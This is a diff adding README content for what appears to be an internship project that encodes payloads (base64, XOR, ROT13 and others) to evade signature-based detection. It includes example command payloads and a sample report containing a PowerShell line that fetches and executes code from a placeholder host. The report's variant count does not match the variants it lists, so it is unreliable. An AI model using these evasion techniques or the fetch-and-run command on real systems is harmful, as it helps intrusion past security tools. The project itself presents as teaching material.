@@ -43,3 +43,95 @@ EDR, IPS, and Firewalls — strictly in a controlled lab environment.
 ---
 
 ## 📂 Project Structure
+
+
+---
+
+## ⚙️ How To Run
+
+```bash
+# Step 1 - Clone the repo
+git clone https://github.com/ghost101-sec/payload-obfuscation-framework
+
+# Step 2 - Go into the folder
+cd payload-obfuscation-framework
+
+# Step 3 - Run the framework
+python payload_framework.py
+```
+
+---
+
+## 💻 Usage Examples
+
+```bash
+# Default demo run
+python payload_framework.py
+
+# Custom payload
+python payload_framework.py -p "cmd.exe /c whoami"
+
+# Custom payload + XOR key
+python payload_framework.py -p "cmd.exe /c whoami" -k 77
+
+# Save JSON report
+python payload_framework.py -p "eval(os.system('id'))" -o report.json
+
+# Verify decoding
+python payload_framework.py -p "test payload" --verify
+```
+
+---
+
+## 📊 Sample Output
+
+=================================================================
+PAYLOAD ENCODER & OBFUSCATION FRAMEWORK — REPORT
+
+Timestamp : 2026-11-04T10:00:00
+XOR Key : 42
+Original : powershell -c “Invoke-Expression(wget http://lab/test)”
+
+EVASION TEST RESULTS
+
+original DETECTED ✗ [3 sig(s): powershell, wget, invoke-expression]
+base64 BYPASSED ✓
+xor BYPASSED ✓
+rot13 BYPASSED ✓
+layered BYPASSED ✓
+hex_escape BYPASSED ✓
+unicode_escape BYPASSED ✓
+
+Bypass rate: 9/11 variants evaded detection
+
+
+---
+
+## 🎓 Learning Outcomes
+
+- How payloads are encoded to evade detection
+- How signature-based detection works and its limitations
+- Python OOP — classes, static methods, modules
+- CLI tool development with argparse
+- JSON report generation
+
+---
+
+## ⚠️ Disclaimer
+
+> This project is built **strictly for educational purposes** 
+> in a **controlled lab environment** as part of a cybersecurity internship.  
+> No real systems were targeted. All payloads are test strings only.
+
+---
+
+## 🏢 Internship Details
+
+| Field | Details |
+|-------|---------|
+| Organization | Unified Mentor |
+| Domain | Cybersecurity |
+| Project | Custom Payload Encoder & Obfuscation Framework |
+| Language | Python 3 |
+
+
